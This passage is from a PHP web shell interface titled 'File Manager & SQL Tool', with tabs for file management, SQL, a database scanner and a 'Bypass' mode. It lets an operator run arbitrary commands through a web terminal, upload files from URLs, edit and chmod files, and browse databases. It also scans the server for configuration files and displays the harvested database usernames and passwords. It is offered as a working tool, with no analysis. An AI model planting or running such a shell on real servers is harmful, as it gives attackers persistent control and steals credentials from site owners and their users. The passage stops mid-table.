        .table { width:100%; border-collapse:collapse; margin-top:12px; background:transparent; }
        .table th, .table td { padding:10px 12px; text-align:left; border-bottom:1px solid rgba(255,255,255,0.03); color:#cfe6ff; font-size:0.95rem; }
        .table th { background:transparent; color:#9fc6ff; font-weight:700; text-transform:uppercase; font-size:0.8rem; }
        .table tr:hover td { background:rgba(255,255,255,0.015); }

        .alert { padding:12px; border-radius:8px; margin-bottom:12px; }
        .alert-success { background:rgba(16,185,129,0.06); color:#9ff3d9; border:1px solid rgba(16,185,129,0.09); }
        .alert-danger { background:rgba(239,68,68,0.06); color:#ffd6d6; border:1px solid rgba(239,68,68,0.09); }

        .terminal { background:#000814; color:#9fffb3; padding:14px; border-radius:10px; font-family:monospace; font-size:0.9rem; border:1px solid rgba(255,255,255,0.03); }
        .terminal pre { white-space:pre-wrap; word-break:break-word; margin-top:8px; color:#a7ffc4; }

        .sql-editor { background:#041022; border:1px solid rgba(255,255,255,0.03); color:#e6eef8; border-radius:8px; padding:12px; font-family:monospace; min-height:120px; }

        .grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(320px,1fr)); gap:14px; }
        .stats { display:flex; gap:12px; margin-bottom:12px; flex-wrap:wrap; }
        .stat-card { background:linear-gradient(180deg,rgba(255,255,255,0.02),rgba(255,255,255,0.01)); padding:12px; border-radius:10px; flex:1; min-width:160px; border:1px solid rgba(255,255,255,0.02); }
    .stat-number { font-size:1.5rem; font-weight:700; color:#dff0ff; }
    .stat-label { color:#9fb7d8; font-size:0.8rem; text-transform:uppercase; }

    /* JS-free edit row toggler */
    .edit-row { display:none; }
    .edit-row:target { display:block; }

        @media (max-width:768px) {
            .container { padding:12px; }
            .nav-tabs { flex-wrap:wrap; }
            .header { flex-direction:column; gap:10px; align-items:stretch; }
            .table th, .table td { padding:8px 10px; font-size:0.9rem; }
        }
    </style>
    </head>
    <body>
<div class="container">
    <div class="header">
        <h1>File Manager & SQL Tool</h1>
        <a href="?logout=1" class="logout-btn">Logout</a>
    </div>

    <!-- Navigation Tabs -->
    <div class="nav-tabs">
        <a href="?mode=files" class="nav-tab <?php echo $mode === 'files' ? 'active' : ''; ?>">📁 File Manager</a>
        <a href="?mode=sql" class="nav-tab <?php echo $mode === 'sql' ? 'active' : ''; ?>">🗄️ SQL Manager</a>
        <a href="?mode=scan" class="nav-tab <?php echo $mode === 'scan' ? 'active' : ''; ?>">🔍 DB Scanner</a>
    <a href="?mode=bypass" class="nav-tab <?php echo $mode === 'bypass' ? 'active' : ''; ?>">🚧 Bypass</a>
    </div>

<!-- Server Info -->
    <?php
    // Collect extended system info (best-effort, PHP5 compatible)
    $sys = array();
    $sys['php_version'] = phpversion();
    $sys['server_os'] = php_uname();
    $sys['web_server'] = isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'CLI';
    $sys['current_user'] = function_exists('get_current_user') ? get_current_user() : 'unknown';
    $sys['document_root'] = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : getcwd();
    $sys['current_dir'] = $dir;
    $sys['disabled_functions'] = isset($disabled_funcs) ? $disabled_funcs : 'None';

    // Uptime & load (Linux-friendly)
    $sys['uptime'] = null;
    $sys['load'] = null;
    if (is_readable('/proc/uptime')) {
        $u = @file_get_contents('/proc/uptime');
        if ($u !== false) {
            $parts = preg_split('/\s+/', trim($u));
            if (isset($parts[0])) {
                $seconds = (int)floatval($parts[0]);
                $days = floor($seconds / 86400);
                $hours = floor(($seconds % 86400) / 3600);
                $mins = floor(($seconds % 3600) / 60);
                $sys['uptime'] = $days . 'd ' . $hours . 'h ' . $mins . 'm';
            }
        }
    }
    if (function_exists('sys_getloadavg')) {
        $loads = @sys_getloadavg();
        if ($loads !== false && is_array($loads)) $sys['load'] = implode(', ', $loads);
    } elseif (is_readable('/proc/loadavg')) {
        $l = @file_get_contents('/proc/loadavg');
        if ($l !== false) $sys['load'] = trim(explode(' ', trim($l))[0]);
    }

    // Memory info (Linux /proc/meminfo)
    $sys['mem_total'] = null; $sys['mem_free'] = null;
    if (is_readable('/proc/meminfo')) {
        $m = @file_get_contents('/proc/meminfo');
        if ($m !== false) {
            if (preg_match('/MemTotal:\s+(\d+) kB/i', $m, $mm)) $sys['mem_total'] = intval($mm[1]) * 1024;
            if (preg_match('/MemFree:\s+(\d+) kB/i', $m, $mf)) $sys['mem_free'] = intval($mf[1]) * 1024;
        }
    }

    // Disk usage for current dir
    $df = @disk_free_space($dir);
    $dt = @disk_total_space($dir);
    $sys['disk_free'] = $df === false ? null : $df;
    $sys['disk_total'] = $dt === false ? null : $dt;

    // Network interfaces (simple best-effort)
    $sys['ip_addresses'] = array();
    if (function_exists('shell_exec')) {
        $ifcfg = @shell_exec("/sbin/ip -4 -o addr show 2>/dev/null || /sbin/ifconfig 2>/dev/null");
        if ($ifcfg) {
            // Extract IPv4 addresses roughly
            if (preg_match_all('/(\d+\.\d+\.\d+\.\d+)/', $ifcfg, $ips)) {
                $sys['ip_addresses'] = array_values(array_unique($ips[1]));
            }
        }
    }
    ?>

    <div class="card">
        <h3>System Information</h3>
        <table class="table">
            <tr><th>PHP Version</th><td><?php echo htmlspecialchars($sys['php_version']); ?></td></tr>
            <tr><th>Server OS</th><td><?php echo htmlspecialchars($sys['server_os']); ?></td></tr>
            <tr><th>Web Server</th><td><?php echo htmlspecialchars($sys['web_server']); ?></td></tr>
            <tr><th>Current User</th><td><?php echo htmlspecialchars($sys['current_user']); ?></td></tr>
            <tr><th>Document Root</th><td><?php echo htmlspecialchars($sys['document_root']); ?></td></tr>
            <tr><th>Current Directory</th><td><?php echo htmlspecialchars($sys['current_dir']); ?></td></tr>
            <tr><th>Disabled Functions</th><td><?php echo htmlspecialchars($sys['disabled_functions']); ?></td></tr>
            <tr><th>Uptime</th><td><?php echo htmlspecialchars($sys['uptime'] !== null ? $sys['uptime'] : 'N/A'); ?></td></tr>
            <tr><th>Load</th><td><?php echo htmlspecialchars($sys['load'] !== null ? $sys['load'] : 'N/A'); ?></td></tr>
            <tr><th>Memory Total</th><td><?php echo $sys['mem_total'] !== null ? number_format($sys['mem_total']) . ' bytes' : 'N/A'; ?></td></tr>
            <tr><th>Memory Free</th><td><?php echo $sys['mem_free'] !== null ? number_format($sys['mem_free']) . ' bytes' : 'N/A'; ?></td></tr>
            <tr><th>Disk Total</th><td><?php echo $sys['disk_total'] !== null ? number_format($sys['disk_total']) . ' bytes' : 'N/A'; ?></td></tr>
            <tr><th>Disk Free</th><td><?php echo $sys['disk_free'] !== null ? number_format($sys['disk_free']) . ' bytes' : 'N/A'; ?></td></tr>
            <tr><th>IP Addresses</th><td><?php echo !empty($sys['ip_addresses']) ? htmlspecialchars(implode(', ', $sys['ip_addresses'])) : 'N/A'; ?></td></tr>
        </table>
    </div>

    <?php if ($mode === 'files'): ?>
        <!-- FILE MANAGER MODE -->
        <?php if (!empty($msg)): ?>
            <div class="alert alert-success"><?php echo $msg; ?></div>
        <?php endif; ?>

        <!-- Navigation -->
        <div class="card">
            <form method="GET" style="display: inline;">
                <div class="form-group">
                    <label>Current Directory:</label>
                    <div style="display: flex; gap: 10px;">
                        <input type="text" name="dir" value="<?php echo htmlspecialchars($dir); ?>" class="form-control" style="flex: 1;">
                        <button type="submit" class="btn">Go</button>
                    </div>
                </div>
            </form>
        </div>

        <!-- File Operations -->
        <div class="grid">
            <div class="card">
                <h3>Upload File</h3>
                <form method="POST" enctype="multipart/form-data">
                    <div class="form-group">
                        <input type="file" name="file" class="form-control" id="file-upload">
                        <label for="file-upload" style="display: block; margin-top: 10px; color: #667eea; cursor: pointer; font-weight: 500;">
                            📎 Choose file or drag & drop here
                        </label>
                    </div>
                    <button type="submit" class="btn btn-success">🚀 Upload File</button>
                </form>
                <form method="POST" style="margin-top:12px;">
                    <div class="form-group">
                        <input type="text" name="upload_url" class="form-control" placeholder="Paste file URL here...">
                    </div>
                    <div class="form-group">
                        <input type="text" name="output_name" class="form-control" placeholder="Output filename (optional)">
                    </div>
                    <button type="submit" class="btn btn-success">🌐 Upload from URL</button>
                </form>
            </div>

            <div class="card">
                <h3>Create Folder</h3>
                <form method="POST">
                    <div class="form-group">
                        <input type="text" name="newfolder" placeholder="Enter folder name..." class="form-control">
                    </div>
                    <button type="submit" class="btn btn-success">✨ Create Folder</button>
                </form>
            </div>

            <div class="card">
                <h3>Create File</h3>
                <form method="POST">
                    <div class="form-group">
                        <input type="text" name="newfile" placeholder="Enter file name..." class="form-control">
                    </div>
                    <div class="form-group">
                        <textarea name="newfile_content" class="form-control" placeholder="Optional initial content" style="min-height: 80px;"></textarea>
                    </div>
                    <button type="submit" class="btn btn-success">📝 Create File</button>
                </form>
            </div>

            <div class="card">
                <h3>Create .htaccess</h3>
                <p style="color:#9fb7d8;">Generate a basic .htaccess to deny access to common script/file extensions. You can add comma-separated exclude patterns (eg. index.php, sitemap.xml, *.css).</p>
                <form method="POST">
                    <div class="form-group">
                        <label>Exclude patterns (comma or space separated):</label>
                        <input type="text" name="ht_exclude" class="form-control" placeholder="index.php sitemap.xml *.css">
                    </div>
                    <div class="form-group">
                        <label>Custom .htaccess content (optional):</label>
                        <textarea name="ht_content" class="form-control" style="min-height:120px;"><?php echo isset($default_ht) ? htmlspecialchars($default_ht) : htmlspecialchars("<FilesMatch "."\\.(cgi|pl|py|php|php3|php4|php5|phtml)\">\nOrder Allow,Deny\nDeny from all\n</FilesMatch>\n\nOptions -Indexes\n"); ?></textarea>
                    </div>
                    <button type="submit" name="create_htaccess" class="btn btn-success">Create .htaccess</button>
                </form>
                <?php if (!empty($msg) && strpos($msg, '.htaccess') !== false): ?>
                    <div class="alert alert-success" style="margin-top:8px;"><?php echo htmlspecialchars($msg); ?></div>
                <?php endif; ?>
            </div>
        </div>

        <!-- File List -->
        <div class="card">
            <h3>Directory Contents</h3>
            <?php if (is_dir($dir)): ?>
                <?php echo '<div style="color:#ff0;background:#222;padding:4px 8px;">DEBUG: Directory = '.htmlspecialchars($dir).'</div>'; ?>
                <table class="table">
                    <thead>
                        <tr>
                <?php echo '<div style="color:#ff0;background:#222;padding:4px 8px;">DEBUG: End of file list</div>'; ?>
                            <th>Name</th>
                            <th>Type</th>
                            <th>Size</th>
                            <th>Actions</th>
                            <th>Status/Chmod</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php
                        // Pagination setup
                        $all_files = array();
                        $sc = scandir($dir);
                        foreach ($sc as $ff) {
                            if ($ff === '.') continue;
                            $all_files[] = $ff;
                        }

                        $total_files = count($all_files);
                        $per_page = 20; // items per page
                        $page = isset($_GET['page']) ? max(1, intval($_GET['page'])) : 1;
                        $pages = max(1, ceil($total_files / $per_page));
                        if ($page > $pages) $page = $pages;
                        $start = ($page - 1) * $per_page;
                        $page_files = array_slice($all_files, $start, $per_page);

                        foreach ($page_files as $f):
                            $path = $dir . DIRECTORY_SEPARATOR . $f;
                            ?>
                                <tr>
                                    <?php
                                    // Get permission
                                    $perm = @fileperms($path);
                                    $permstr = $perm !== false ? substr(sprintf('%o', $perm), -4) : '----';
                                    $isWritable = is_writable($path);
                                    $isReadable = is_readable($path);
                                    // Status color logic
                                    $status = 'white';
                                    $statusText = 'Normal';
                                    if ($permstr === '777' || $permstr === '666') {
                                        $status = 'green'; $statusText = 'Writable';
                                    } elseif ($permstr === '000' || !$isReadable) {
                                        $status = 'red'; $statusText = 'No Access';
                                    } elseif ($permstr === '400' || !$isWritable) {
                                        $status = 'red'; $statusText = 'Read Only';
                                    }
                                    $color = $status === 'green' ? '#10b981' : ($status === 'red' ? '#ef4444' : '#dbe7ff');
                                    ?>
                                    <?php if ($f === '..'): ?>
                                        <td><a href="?dir=<?php echo urlencode(dirname($dir)); ?>" style="color: #667eea;">[..] Parent Directory</a></td>
                                        <td>📁</td>
                                        <td>-</td>
                                        <td>-</td>
                                        <td>-</td>
                                    <?php elseif (is_dir($path)): ?>
                                        <td><a href="?dir=<?php echo urlencode($path); ?>" style="color: #667eea;">📁 <?php echo htmlspecialchars($f); ?></a></td>
                                        <td>Folder</td>
                                        <td>-</td>
                                        <td>
                                            <form method="POST" style="display: inline;">
                                                <input type="hidden" name="delete" value="<?php echo htmlspecialchars($f); ?>">
                                                <button type="submit" class="btn btn-danger" onclick="return confirm('Delete folder?')">Delete</button>
                                            </form>
                                            <form method="POST" style="display: inline; margin-left: 5px;">
                                                <input type="hidden" name="oldname" value="<?php echo htmlspecialchars($f); ?>">
                                                <input type="text" name="rename" placeholder="New name" style="padding: 5px; border-radius: 4px; border: 1px solid #ccc;">
                                                <button type="submit" class="btn">Rename</button>
                                            </form>
                                        </td>
                                        <td style="color:<?php echo $color; ?>;font-weight:bold;">
                                            <?php echo $permstr; ?>
                                            <span style="margin-left:6px;">● <?php echo $statusText; ?></span>
                                            <form method="POST" style="display:inline; margin-left:8px;">
                                                <input type="hidden" name="chmod_target" value="<?php echo htmlspecialchars($f); ?>">
                                                <input type="text" name="chmod_value" value="<?php echo $permstr; ?>" style="width:50px;">
                                                <button type="submit" class="btn btn-success" style="padding:2px 8px;">Chmod</button>
                                            </form>
                                        </td>
                                    <?php else: ?>
                                        <td><a href="?dir=<?php echo urlencode($dir); ?>&view=<?php echo urlencode($f); ?>" style="color: #667eea;">📄 <?php echo htmlspecialchars($f); ?></a></td>
                                        <td>File</td>
                                        <td><?php echo filesize($path); ?> bytes</td>
                                        <td>
                                            <form method="POST" style="display: inline;">
                                                <input type="hidden" name="delete" value="<?php echo htmlspecialchars($f); ?>">
                                                <button type="submit" class="btn btn-danger" onclick="return confirm('Delete file?')">Delete</button>
                                            </form>
                                            <form method="POST" style="display: inline; margin-left: 5px;">
                                                <input type="hidden" name="oldname" value="<?php echo htmlspecialchars($f); ?>">
                                                <input type="text" name="rename" placeholder="New name" style="padding: 5px; border-radius: 4px; border: 1px solid #ccc;">
                                                <button type="submit" class="btn">Rename</button>
                                            </form>
                                            <a href="?dir=<?php echo urlencode($dir); ?>&edit=<?php echo urlencode($f); ?>" class="btn" style="margin-left: 5px;">Edit</a>
                                        </td>
                                        <td style="color:<?php echo $color; ?>;font-weight:bold;">
                                            <?php echo $permstr; ?>
                                            <span style="margin-left:6px;">● <?php echo $statusText; ?></span>
                                            <form method="POST" style="display:inline; margin-left:8px;">
                                                <input type="hidden" name="chmod_target" value="<?php echo htmlspecialchars($f); ?>">
                                                <input type="text" name="chmod_value" value="<?php echo $permstr; ?>" style="width:50px;">
                                                <button type="submit" class="btn btn-success" style="padding:2px 8px;">Chmod</button>
                                            </form>
                                        </td>
                                    <?php endif; ?>
                                </tr>
                            <?php endforeach; ?>
                    </tbody>
                </table>

                <?php if ($pages > 1): ?>
                    <div style="margin-top:10px; display:flex; gap:6px; flex-wrap:wrap;">
                        <?php
                        $base = '?dir=' . urlencode($dir);
                        if (isset($_GET['mode'])) $base .= '&mode=' . urlencode($_GET['mode']);
                        // show up to first 10 pages to keep UI compact
                        $maxShow = 10;
                        $end = min($pages, $maxShow);
                        for ($p = 1; $p <= $end; $p++): ?>
                            <a href="<?php echo $base . '&page=' . $p; ?>" class="btn" style="padding:6px 10px;<?php echo $p == $page ? ' background:rgba(59,130,246,0.12); border-color:rgba(59,130,246,0.2);' : ''; ?>"><?php echo $p; ?></a>
                        <?php endfor; ?>
                        <?php if ($pages > $maxShow): ?>
                            <span style="align-self:center; color:#a9c0e8;">…</span>
                            <a href="<?php echo $base . '&page=' . $pages; ?>" class="btn" style="padding:6px 10px;"><?php echo $pages; ?></a>
                        <?php endif; ?>
                    </div>
                <?php endif; ?>
            <?php endif; ?>
        </div>

        <!-- File View/Edit -->
        <?php if (isset($_GET['view'])): ?>
            <?php
            $file = $dir . DIRECTORY_SEPARATOR . $_GET['view'];
            if (is_file($file)):
            ?>
                <div class="card">
                    <h3>View File: <?php echo htmlspecialchars($_GET['view']); ?></h3>
                    <pre style="background:#041022; color:#e6eef8; padding:15px; border-radius:8px; overflow:auto; border:1px solid rgba(255,255,255,0.05); white-space:pre-wrap; word-break:break-word; font-family:monospace;"><?php echo htmlspecialchars(file_get_contents($file)); ?></pre>
                </div>
            <?php endif; ?>
        <?php endif; ?>

        <?php if (isset($_GET['edit'])): ?>
            <?php
            $file = $dir . DIRECTORY_SEPARATOR . $_GET['edit'];
            if (is_file($file)):
                $content = htmlspecialchars(file_get_contents($file));
            ?>
                <div class="card">
                    <h3>Edit File: <?php echo htmlspecialchars($_GET['edit']); ?></h3>
                    <form method="POST">
                        <div class="form-group">
                            <textarea name="editfile" class="sql-editor"><?php echo $content; ?></textarea>
                        </div>
                        <input type="hidden" name="filename" value="<?php echo htmlspecialchars($_GET['edit']); ?>">
                        <button type="submit" class="btn btn-success">Save Changes</button>
                    </form>
                </div>
            <?php endif; ?>
        <?php endif; ?>

        <!-- Database Config Scanner -->
        <div class="card">
            <h3>🔎 Database Config Scanner</h3>
            <form method="POST">
                <div class="grid">
                    <div class="form-group">
                        <label>Scan Path:</label>
                        <input type="text" name="scan_path" value="<?php echo htmlspecialchars($dir); ?>" class="form-control">
                    </div>
                    <div class="form-group">
                        <label>Max Files:</label>
                        <input type="text" name="scan_limit" value="2000" class="form-control">
                    </div>
                    <div class="form-group">
                        <label>Max Bytes per File:</label>
                        <input type="text" name="scan_bytes" value="262144" class="form-control">
                    </div>
                </div>
                <button type="submit" name="scan_db" class="btn">🔍 Scan for Database Configs</button>
            </form>

            <?php if ($scan_dur !== null): ?>
                <div class="alert alert-success" style="margin-top: 15px;">
                    ✅ Scan completed in <strong><?php echo number_format($scan_dur, 2); ?>s</strong> · Found <strong><?php echo count($scan_items); ?></strong> database configurations
                </div>
            <?php endif; ?>

            <?php if ($scan_msg): ?>
                <div class="alert alert-danger" style="margin-top: 15px;">
                    ❌ <?php echo htmlspecialchars($scan_msg); ?>
                </div>
            <?php endif; ?>

            <?php if ($scan_items): ?>
                <table class="table" style="margin-top: 15px;">
                    <thead>
                        <tr>
                            <th>File Path</th>
                            <th>Database</th>
                            <th>Username</th>
                            <th>Password</th>
                            <th>Host</th>
                            <th>Type</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php foreach ($scan_items as $item): ?>
                            <tr>
                                <td style="font-family: monospace; font-size: 12px; word-break: break-all;"><?php echo htmlspecialchars(isset($item['file']) ? $item['file'] : ''); ?></td>
                                <td><?php echo htmlspecialchars(isset($item['db']) ? $item['db'] : ''); ?></td>
                                <td><?php echo htmlspecialchars(isset($item['user']) ? $item['user'] : ''); ?></td>
                                <td><?php echo htmlspecialchars(isset($item['pass']) ? $item['pass'] : ''); ?></td>
                                <td><?php echo htmlspecialchars(isset($item['host']) ? $item['host'] : ''); ?></td>
                                <td><?php echo htmlspecialchars(isset($item['hint']) ? $item['hint'] : ''); ?></td>
                                <td>
                                    <form method="POST" style="display:inline;">
                                        <input type="hidden" name="apply_host" value="<?php echo htmlspecialchars(isset($item['host']) ? $item['host'] : 'localhost'); ?>">
                                        <input type="hidden" name="apply_user" value="<?php echo htmlspecialchars(isset($item['user']) ? $item['user'] : ''); ?>">
                                        <input type="hidden" name="apply_pass" value="<?php echo htmlspecialchars(isset($item['pass']) ? $item['pass'] : ''); ?>">
                                        <input type="hidden" name="apply_db" value="<?php echo htmlspecialchars(isset($item['db']) ? $item['db'] : ''); ?>">
                                        <button type="submit" name="apply_scan" class="btn">Apply</button>
                                    </form>
                                </td>
                            </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            <?php elseif ($scan_dur !== null && !$scan_msg): ?>
                <div class="alert alert-success" style="margin-top: 15px;">
                    No database configurations found in the scanned path. Try scanning a different directory or increasing the limits.
                </div>
            <?php endif; ?>
        </div>

        <!-- Terminal -->
        <div class="card">
            <h3>Web Terminal</h3>
            <form method="POST">
                <div class="form-group">
                    <input type="text" name="cmd" placeholder="Enter command..." class="form-control" style="font-family: 'Courier New', monospace;">
                </div>
                <button type="submit" class="btn">Execute Command</button>
            </form>
            <?php if (!empty($terminal_output)): ?>
                <div class="terminal" style="margin-top: 15px;">
                    <pre><?php echo htmlspecialchars($terminal_output); ?></pre>
                </div>
            <?php endif; ?>
        </div>

    <?php elseif ($mode === 'sql'): ?>
        <!-- SQL MANAGER MODE -->
        <div class="card">
            <h3>Mini SQL Manager</h3>
            
            <?php if (!$db_conn): ?>
                <!-- Database Connection Form -->
                <form method="POST">
                    <div class="grid">
                        <div class="form-group">
                            <label>Host:</label>
                            <input type="text" name="db_host" value="localhost" class="form-control">
                        </div>
                        <div class="form-group">
                            <label>Username:</label>
                            <input type="text" name="db_user" class="form-control">
                        </div>
                        <div class="form-group">
                            <label>Password:</label>
                            <input type="password" name="db_pass" class="form-control">
                        </div>
                        <div class="form-group">
                            <label>Database:</label>
                            <input type="text" name="db_name" class="form-control">
                        </div>
                    </div>
                    <button type="submit" name="db_connect" class="btn btn-success">🔗 Connect to Database</button>
                </form>
            <?php else: ?>
                <div style="display:flex; gap:12px;">
                    <div style="width: 240px;">
                        <div class="card">
                            <div style="display:flex; justify-content:space-between; align-items:center;">
                                <strong>Tables</strong>
                                <form method="POST" style="display:inline;">
                                    <button type="submit" name="db_disconnect" class="btn btn-danger">Disconnect</button>
                                </form>
                            </div>
                            <hr>
                            <div style="max-height:520px; overflow:auto;">
                                <?php if (!empty($db_tables)): ?>
                                    <ul style="list-style: none; padding:0; margin:0;">
                                        <?php foreach ($db_tables as $table): ?>
                                            <li style="margin-bottom:6px;"><a href="?mode=sql&table=<?php echo urlencode($table); ?>" style="color:#bcd3ff; text-decoration:none;"><?php echo htmlspecialchars($table); ?></a></li>
                                        <?php endforeach; ?>
                                    </ul>
                                <?php else: ?>
                                    <div style="color:#9fb7d8;">No tables</div>
                                <?php endif; ?>
                            </div>
                        </div>
                    </div>

                    <div style="flex:1;">
                        <?php if (!empty($db_error)): ?>
                            <div class="alert <?php echo strpos($db_error, 'successfully') !== false ? 'alert-success' : 'alert-danger'; ?>">
                                <?php echo htmlspecialchars($db_error); ?>
                            </div>
                        <?php endif; ?>

                        <div class="card">
                            <h4>🔍 SQL Query</h4>
                            <form method="POST">
                                <div class="form-group">
                                    <textarea name="sql_query" class="sql-editor" placeholder="Enter your SQL query here..."><?php echo htmlspecialchars($db_query); ?></textarea>
                                </div>
                                <button type="submit" name="execute_query" class="btn btn-success">⚡ Execute Query</button>
                            </form>
                        </div>

                        <?php if (!empty($db_current_table)): ?>
                            <div class="card" style="margin-top:12px;">
                                <div style="display:flex; justify-content:space-between; align-items:center;">
                                    <strong>Table: <?php echo htmlspecialchars($db_current_table); ?></strong>
                                    <div>
                                        <a href="?mode=sql&table=<?php echo urlencode($db_current_table); ?>&export=csv" class="btn">Export CSV</a>
                                    </div>
                                </div>
                                <div style="margin-top:8px;">
                                    <strong>Structure</strong>
                                    <?php if (!empty($table_structure)): ?>
                                        <table class="table" style="margin-top:8px;">
                                            <thead><tr><th>Field</th><th>Type</th><th>Null</th><th>Key</th><th>Default</th><th>Extra</th></tr></thead>
                                            <tbody>
                                                <?php foreach ($table_structure as $col): ?>
                                                    <tr>
                                                        <td><?php echo htmlspecialchars($col['Field']); ?></td>
                                                        <td><?php echo htmlspecialchars($col['Type']); ?></td>
                                                        <td><?php echo htmlspecialchars($col['Null']); ?></td>
                                                        <td><?php echo htmlspecialchars($col['Key']); ?></td>
                                                        <td><?php echo htmlspecialchars($col['Default']); ?></td>
                                                        <td><?php echo isset($col['Extra']) ? htmlspecialchars($col['Extra']) : ''; ?></td>
                                                    </tr>
                                                <?php endforeach; ?>
                                            </tbody>
                                        </table>
                                    <?php endif; ?>
                                </div>

                                <div style="margin-top:10px;">
                                    <?php if (isset($db_current_table) && $db_current_table !== ''): ?>
                                        <h4 style="margin-bottom:8px;">Browse: <?php echo htmlspecialchars($db_current_table); ?> <?php if (isset($total_rows)) { echo '<span style="font-size:0.9rem;color:#9fb7d8">(page '.intval(isset($tbl_page)?$tbl_page:1).', per 50, total '.intval($total_rows).')</span>'; } ?></h4>
                                    <?php endif; ?>
                                    <strong>Rows</strong>
                                    <form method="GET" style="display:flex;gap:8px;align-items:center;margin-top:8px;flex-wrap:wrap;">
                                        <?php if (isset($db_current_table)): ?>
                                            <input type="hidden" name="mode" value="sql">
                                            <input type="hidden" name="table" value="<?php echo htmlspecialchars($db_current_table); ?>">
                                        <?php endif; ?>
                                        <label>Order
                                            <select name="sort" style="margin-left:6px;">
                                                <option value="">-</option>
                                                <?php if (!empty($cols)) { foreach ($cols as $fcol) { $sel = (isset($_GET['sort']) && $_GET['sort']===$fcol)?'selected':''; echo '<option value="'.htmlspecialchars($fcol).'" '.$sel.'>'.htmlspecialchars($fcol).'</option>'; } } ?>
                                            </select>
                                        </label>
                                        <label>
                                            <select name="dir"><option <?php echo (isset($_GET['dir']) && strtoupper($_GET['dir'])==='ASC')?'selected':''; ?>>ASC</option><option <?php echo (isset($_GET['dir']) && strtoupper($_GET['dir'])==='DESC')?'selected':''; ?>>DESC</option></select>
                                        </label>
                                        <label>Per <input type="text" name="per" value="<?php echo isset($tbl_per_page)?intval($tbl_per_page):50; ?>" style="width:70px; margin-left:6px;"></label>
                                        <label>Page <input type="text" name="tblpage" value="<?php echo isset($tbl_page)?intval($tbl_page):1; ?>" style="width:70px; margin-left:6px;"></label>
                                        <?php
                                            // raw toggle link (show unsanitized field values)
                                            $raw = isset($_GET['raw']) && $_GET['raw']=='1';
                                            $qs = $_GET; if ($raw) { unset($qs['raw']); } else { $qs['raw'] = '1'; }
                                            $toggleRawUrl = strtok($_SERVER['REQUEST_URI'], '?') . '?' . http_build_query($qs);
                                        ?>
                                        <a class="btn gray" href="<?php echo htmlspecialchars($toggleRawUrl); ?>" style="margin-left:6px"><?php echo $raw ? 'Hide raw' : 'Show raw'; ?></a>
                                        <button class="btn">Go</button>
                                    </form>
                                    <?php if (!empty($db_result)): ?>
                                        <div style="overflow-x:auto; margin-top:8px;">
                                            <!-- Insert toggle/form -->
                                            <div style="margin-bottom:8px;">
                                                <button class="btn" type="button" onclick="document.getElementById('insert-form').style.display = document.getElementById('insert-form').style.display === 'none' ? 'block' : 'none';">+ Insert Row</button>
                                            </div>
                                            <div id="insert-form" style="display:none; margin-bottom:8px;">
                                                <form method="POST">
                                                    <input type="hidden" name="table" value="<?php echo htmlspecialchars($db_current_table); ?>">
                                                    <input type="hidden" name="insert_row" value="1">
                                                    <div style="display:flex;flex-wrap:wrap;gap:8px;">
                                                        <?php foreach ($table_structure as $colf): $cname = $colf['Field']; ?>
                                                            <div style="flex:1 1 200px;"><label style="display:block;font-size:0.9rem;color:#9fb7d8"><?php echo htmlspecialchars($cname); ?></label>
                                                                <input type="text" name="fields[<?php echo htmlspecialchars($cname); ?>]" class="form-control"></div>
                                                        <?php endforeach; ?>
                                                    </div>
                                                    <div style="margin-top:8px;"><button type="submit" class="btn btn-success">Insert</button></div>
                                                </form>
                                            </div>
                                            <?php
                                                // compute $cols safely (from current results or table structure)
                                                $cols = array();
                                                if (!empty($db_result) && is_array($db_result) && isset($db_result[0]) && is_array($db_result[0])) {
                                                    $cols = array_keys($db_result[0]);
                                                } elseif (!empty($table_structure) && is_array($table_structure)) {
                                                    foreach ($table_structure as $cf) { if (isset($cf['Field'])) $cols[] = $cf['Field']; }
                                                }

                                                // detect common user-like columns to quickly show usernames/emails
                                                $userCandidates = array('username','user','email','login','name','user_name','email_address');
                                                $foundUserCols = array();
                                                foreach ($cols as $c) {
                                                    $lc = strtolower($c);
                                                    foreach ($userCandidates as $uc) {
                                                        if ($lc === $uc || strpos($lc, $uc) !== false) { $foundUserCols[] = $c; break; }
                                                    }
                                                }
                                                if (!empty($foundUserCols) && !empty($db_result) && is_array($db_result)) {
                                                    echo '<div style="margin-bottom:8px;">';
                                                    echo '<button class="btn" type="button" onclick="var e=document.getElementById(\'user-list\'); e.style.display = e.style.display === \'none\' ? \'block\' : \'none\';">👥 Show users</button>';
                                                    echo '</div>';
                                                    echo '<div id="user-list" style="display:none;margin-bottom:8px;">';
                                                    echo '<ul style="list-style:none;padding-left:0;margin:0;">';
                                                    foreach ($db_result as $r) {
                                                        $vals = array();
                                                        foreach ($foundUserCols as $fc) { $vals[] = htmlspecialchars(isset($r[$fc]) ? $r[$fc] : ''); }
                                                        echo '<li style="font-family:monospace;padding:4px 0;border-bottom:1px solid rgba(255,255,255,0.02);">' . implode(' | ', $vals) . '</li>';
                                                    }
                                                    echo '</ul></div>';
                                                }
                                            ?>
                                            <table class="table">
                                                <thead>
                                                    <tr>
                                                            <?php $cols = array_keys($db_result[0]); foreach ($cols as $column): ?>
                                                                <?php
                                                                    $curSort = isset($_GET['sort']) ? $_GET['sort'] : '';
                                                                    $curDir = isset($_GET['dir']) ? strtolower($_GET['dir']) : 'asc';
                                                                    $newDir = ($curSort === $column && $curDir === 'asc') ? 'desc' : 'asc';
                                                                    $sortUrl = '?mode=sql&table=' . urlencode($db_current_table) . '&sort=' . urlencode($column) . '&dir=' . $newDir;
                                                                ?>
                                                                <th><a href="<?php echo $sortUrl; ?>" style="color:inherit; text-decoration:none;"><?php echo htmlspecialchars($column); ?><?php if ($curSort === $column) echo $curDir === 'asc' ? ' ▲' : ' ▼'; ?></a></th>
                                                            <?php endforeach; ?>
                                                            <th>Actions</th>
                                                    </tr>
                                                </thead>
                                                <tbody>
                                                        <?php foreach ($db_result as $row): ?>
                                                            <tr>
                                                                <?php foreach ($cols as $c): ?>
                                                                    <?php if (isset($_GET['raw']) && $_GET['raw']=='1'): ?>
                                                                        <td><?php echo isset($row[$c]) ? $row[$c] : ''; ?></td>
                                                                    <?php else: ?>
                                                                        <td><?php echo htmlspecialchars(isset($row[$c]) ? $row[$c] : ''); ?></td>
                                                                    <?php endif; ?>
                                                                <?php endforeach; ?>
